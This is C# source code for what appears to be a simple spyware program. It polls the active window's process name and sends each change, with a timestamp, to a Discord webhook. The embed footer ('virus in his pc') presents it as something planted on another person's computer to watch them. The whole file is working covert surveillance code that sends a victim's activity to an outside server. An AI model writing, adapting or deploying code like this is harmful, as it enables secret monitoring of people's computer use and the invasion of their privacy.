using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;

class Program
{
    static string LCan = "";
    static async Task Main(string[] args)
    {
        Console.WriteLine("Monitoring started. Press Ctrl+C to exit.");
        while (true)
        {
            string can = GetCan();
            if (!string.IsNullOrEmpty(can) && can != LCan)
            {
                await SendEmbed(can);
                LCan = can;
            }
            await Task.Delay(80);
        }
    }

    static string GetCan()
    {
        IntPtr hwnd = GetForegroundWindow();
        if (hwnd == IntPtr.Zero)
            return null;
        uint pid;
        GetWindowThreadProcessId(hwnd, out pid);
        Process proc = Process.GetProcessById((int)pid);
        return proc.MainModule.ModuleName;
    }

    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    static async Task SendEmbed(string processName)
    {
        var url = Environment.GetEnvironmentVariable("DISCORD_WEBHOOK_URL");
        var payload = new
        {
            embeds = new[]
            {
                new
                {
                    title = "🍓 Noob Watcher",
                    description = $"Switched to process: ``{processName}``",
                    color = 15158332,
                    fields = new[]
                    {
                        new
                        {
                            name = "Current Time",
                            value = DateTime.Now.ToString("MM-dd-yyyy HH:mm:ss")
                        }
                    },
                    footer = new
                    {
                        text = "Process Watcher is keeping an eye on you 👀 (virus in his pc 😍)"
                    }
                }
            }
        };

        using (var client = new HttpClient())
        {
            var json = JsonConvert.SerializeObject(payload);
            var data = new StringContent(json, Encoding.UTF8, "application/json");
            await client.PostAsync(url, data);
        }
    }
}
